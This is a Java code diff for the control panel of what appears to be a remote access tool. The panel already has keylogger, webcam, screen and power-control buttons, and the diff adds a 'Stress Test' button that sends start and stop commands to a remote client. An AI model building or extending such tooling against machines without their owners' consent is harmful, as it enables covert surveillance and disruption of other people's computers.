@@ -1032,13 +1032,43 @@ public void removeClientCard(String clientName) {
     JButton keyloggerBtn = createDarkButton("Keylogger");
     JButton taskBtn = createDarkButton("Task Manager");
     JButton powerBtn = createDarkButton("System Power");
+    JButton stressBtn = createDarkButton("Stress Test");
     JButton closeBtn = createDarkButton("Close");
 
     screenBtn.addActionListener(e -> {
         addLog("[SCREEN] Open screen for " + clientName);
         openBigScreen(clientName);
     });
+stressBtn.addActionListener(e -> {
 
+    String[] options = {
+            "Bắt đầu Stress Test",
+            "Dừng Stress Test"
+    };
+
+    String selected =
+            (String) JOptionPane.showInputDialog(
+                    dialog,
+                    "Chọn thao tác",
+                    "Stress Test",
+                    JOptionPane.PLAIN_MESSAGE,
+                    null,
+                    options,
+                    options[0]
+            );
+
+    if (selected == null) {
+        return;
+    }
+
+    if (selected.equals("Bắt đầu Stress Test")) {
+        controller.sendStressCommand(clientName, "START");
+    }
+
+    if (selected.equals("Dừng Stress Test")) {
+        controller.sendStressCommand(clientName, "STOP");
+    }
+});
     webcamBtn.addActionListener(e -> {
         addLog("[WEBCAM] Open webcam for " + clientName);
     });
